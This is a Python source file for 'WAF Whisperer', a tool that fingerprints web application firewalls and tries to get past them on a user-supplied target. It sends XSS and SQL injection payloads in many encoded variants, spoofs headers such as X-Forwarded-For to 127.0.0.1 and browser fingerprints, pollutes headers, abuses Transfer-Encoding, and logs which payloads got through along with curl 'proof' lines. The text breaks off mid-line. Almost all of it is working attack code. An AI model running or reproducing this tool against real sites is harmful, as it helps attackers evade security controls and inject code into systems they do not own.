#!/usr/bin/env python3

import requests
import argparse
import sys
import urllib3
import time
import random
from urllib.parse import quote
import os 
import pathlib
import re 

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colors
CYAN = '\033[1;36m'
GREEN = '\033[1;32m'
RED = '\033[1;31m'
YELLOW = '\033[1;33m'
RESET = '\033[0m'
BOLD = '\033[1m'

# Global list to store bypass and potential vulnerability details
SUCCESSFUL_BYPASSES = [] 
# Global to store the discovered rate limit delay
GLOBAL_SLEEP_DELAY = 0.5 
# Global to store the discovered maximum payload length
MAX_PAYLOAD_LENGTH = 1000 
# Global flag for "The Scribe" (Curl Generation)
GENERATE_CURL_PROOF = False

def print_banner():
    banner = r"""
  _    _   ___   ______  _     _  _   _  _____   _____ ______   _____ ______  
 | |  | |/ _ \ |  ___|| |   | || | | ||_   __|/  ___|| ___ \|  ___|| ___ \
 | |  | / /_\ \| |_   | |   | || |_| |  | |  \ `--. | |_/ /| |__  | |_/ /
 | |/\| |  _  ||  _|  | |/\| ||  _  |  | |   `--. \|  __/ |  __| |    / 
 \  /\  / | | || |    \  /\  /| | | | _| |_ /\__/ /| |    | |___ | |\ \ 
  \/  \/\_| |_/\_|     \/  \/ \_| |_/ \___/ \____/ \_|    \____/ \_| \_|
"""
    print(f"{CYAN}{banner}{RESET}")
    print(f"{YELLOW}    [+] Created by: R00t3dbyFa17h/Kr0n0s510{RESET}")
    print(f"{YELLOW}    [+] v6.0 - The Ghost Update{RESET}")
    print(f"{CYAN}    ------------------------------------------------{RESET}\n")

# Phase 0: TLS/Client Emulation Headers
def get_emulation_headers(url):
    domain = url.split('//')[-1].split('/')[0]
    return {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': f'https://{domain}/',
        'DNT': '1', 
        'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
        'Sec-Ch-Ua-Mobile': '?0',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
    }

# NEW FEATURE: The Imposter (Header Spoofing)
def apply_imposter_headers(headers):
    print(f"{BOLD}[*] ENGAGING 'THE IMPOSTER' (Injecting Internal Trust Headers)...{RESET}")
    spoof_headers = {
        'X-Originating-IP': '127.0.0.1',
        'X-Forwarded-For': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'Client-IP': '127.0.0.1',
        'X-Host': '127.0.0.1',
        'X-Real-IP': '127.0.0.1'
    }
    headers.update(spoof_headers)
    return headers

def check_waf(url, headers_ua):
    print(f"{BOLD}[*] Engaging Ghost Mode on {url}...{RESET}")
    time.sleep(1) 
    
    waf_signatures = {
        'Cloudflare': ['cf-ray', '__cfduid', 'cf-cache-status', 'server: cloudflare'],
        'AWS WAF': ['x-amzn-requestid', 'x-amz-id-2', 'server: awselb'],
        'Imperva Incapsula': ['x-iinfo', 'x-cdn', 'incap_ses', 'visid_incap'],
        'F5 BIG-IP': ['bigip', 'x-cnection', 'server: big-ip'],
        'Akamai': ['akamai', 'x-akamai', 'server: akamai'],
        'ModSecurity': ['mod_security', 'server: mod_security'],
        'Citrix NetScaler': ['ns_af', 'citrix_ns_id', 'server: netscaler'],
    }
    
    try:
        r = requests.get(url, headers=headers_ua, timeout=15, verify=False)
        all_headers = {k.lower(): v.lower() for k, v in r.headers.items()}
        detected = False

        print(f"[*] Analyzing Defenses (Passive)...")

        for vendor, sigs in waf_signatures.items():
            for sig in sigs:
                if "server:" in sig:
                    server_sig = sig.split(":")[1].strip()
                    if "server" in all_headers and server_sig in all_headers["server"]:
                        print(f"{GREEN}[+] WAF DETECTED: {vendor}{RESET}")
                        detected = True
                        break 
                else:
                    for h_key in all_headers:
                        if sig in h_key:
                            print(f"{GREEN}[+] WAF DETECTED: {vendor} (Found Header: {h_key}){RESET}")
                            detected = True
                            break
        if not detected:
            print(f"{YELLOW}[-] No specific vendor signature found (Generic WAF possible){RESET}")
    except Exception as e:
        print(f"{RED}[!] Connection failed: {e}{RESET}")

# UPDATED: Added logic for "The Scribe" (Curl Proof Generation)
def send_payload(url, payload, headers_in, description, method="GET"):
    try:
        request_headers = headers_in.copy()
        separator = "&" if "?" in url else "?"
        target_full = f"{url}{separator}q={payload}"
        
        data_to_send = {}
        
        if method == "GET":
            r = requests.get(target_full, headers=request_headers, timeout=10, verify=False)
        elif method == "POST":
            data_to_send = {"q": payload} if payload != "N/A" else {}
            r = requests.post(url, data=data_to_send, headers=request_headers, timeout=10, verify=False)
        
        code = r.status_code
        
        if code == 403 or code == 406:
            status = f"{RED}BLOCKED{RESET}"
        elif code == 200 or code in [404, 405, 500, 501]:
            if code == 200:
                status = f"{GREEN}BYPASSED{RESET}"
            else:
                status = f"{YELLOW}ALLOWED (App Error){RESET}"
            
            SUCCESSFUL_BYPASSES.append({
                "type": description, 
                "method": method, 
                "payload": payload, 
                "url": r.url,
                "code": code
            })
        else:
            status = f"{YELLOW}{code}{RESET}"
            
        print(f"{description:<25} | {status:<25} | {code}")
        
        # --- NEW FEATURE: THE SCRIBE (CURL GENERATOR) ---
        if GENERATE_CURL_PROOF and code == 200:
            print(f"    {CYAN}[Proof]{RESET} curl -X {method} '{url}'", end="")
            if method == "POST":
                print(f" -d '{payload}'", end="")
            print(f" -H 'User-Agent: WAF-Whisper' --insecure")
        # -----------------------------------------------

        time.sleep(0.3)
        return r 
    except:
        print(f"{description:<25} | {RED}ERROR{RESET}            | -")
        return None

def test_bypass(url, headers_ua):
    print(f"\n{BOLD}[*] Whispering Payload Variants (Active Evasion Test)...{RESET}")
    print(f"{CYAN}{'TYPE':<25} | {'STATUS':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")

    base_payload = "<script>alert(1)</script>"
    
    # Standard Mutations
    mutations = {
        "Original Payload": base_payload,
        "URL Encoded": quote(base_payload),
        "Double URL Encoded": quote(quote(base_payload)),
        "Case Variation": "<ScRiPt>alert(1)</sCrIpT>",
        "Comment Obfuscation": "<script/-->alert(1)</script>",
        "Null Byte Injection": "<script%00>alert(1)</script>"
    }

    for name, payload in mutations.items():
        send_payload(url, payload, headers_ua, name)

    try:
        send_payload(url, base_payload, headers_ua, "Method: POST", method="POST")
    except:
        pass

    try:
        trust_headers = headers_ua.copy()
        trust_headers['Referer'] = url
        trust_headers['Origin'] = url
        send_payload(url, quote(base_payload), trust_headers, "Referer Spoofing")
        
        google_headers = headers_ua.copy()
        google_headers['Referer'] = "https://www.google.com"
        send_payload(url, quote(base_payload), google_headers, "Google Referer")
    except:
        pass

    try:
        json_headers = headers_ua.copy()
        json_headers['Content-Type'] = 'application/json'
        send_payload(url, base_payload, json_headers, "Content-Type Confusion", method="POST")
    except:
        pass

# NEW FEATURE: The Shapeshifter (Advanced Automated Mutation)
def test_shapeshifter(url, headers_ua):
    print(f"\n{BOLD}[*] ENGAGING 'THE SHAPESHIFTER' (Automated Encoding Mutation)...{RESET}")
    print(f"{CYAN}{'MUTATION TYPE':<25} | {'STATUS':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")
    
    # Base payloads to mutate
    base_xss = "<script>alert(1)</script>"
    base_sqli = "' OR 1=1 --"
    
    # Define mutations logic
    mutations_list = [
        ("Base XSS", base_xss),
        ("Unicode Escape", "".join([f"\\u{ord(c):04x}" for c in base_xss])),
        ("Hex Encoding", "".join([f"\\x{ord(c):02x}" for c in base_xss])),
        ("HTML Entities", "".join([f"&#{ord(c)};" for c in base_xss])),
        ("Base SQLi", base_sqli),
        ("Double URL SQLi", quote(quote(base_sqli))),
        ("SQLi Comment Bypass", "'/**/OR/**/1=1/**/--")
    ]
    
    for desc, payload in mutations_list:
        send_payload(url, payload, headers_ua, desc)

def test_protocol_fuzz(url, headers_ua):
    print(f"\n{BOLD}[*] Initiating HTTP Protocol Abuse Tests (Fuzzing/Header Pollution)...{RESET}")
    print(f"{CYAN}{'TYPE':<25} | {'STATUS':<25} | {'CODE'}{RESET}")
    print(f"{CYAN}{'-'*60}{RESET}")
    
    base_payload = "' OR 1=1 --" 

    hhp_headers = headers_ua.copy()
    hhp_headers['X-Forwarded-For'] = '127.0.0.1' 
    hhp_headers['X-Forwarded-For'] = base_payload 
    
    send_payload(url, base_payload, hhp_headers, "Header Pollution (XFF)")

    te_headers = headers_ua.copy()
    te_headers['Transfer-Encoding'] = ' chunked' 
    
    try:
        r = requests.post(url, data=f"q={base_payload}", headers=te_headers, timeout=10, verify=False)
        code = r.status_code
        status = f"{GREEN}BYPAS
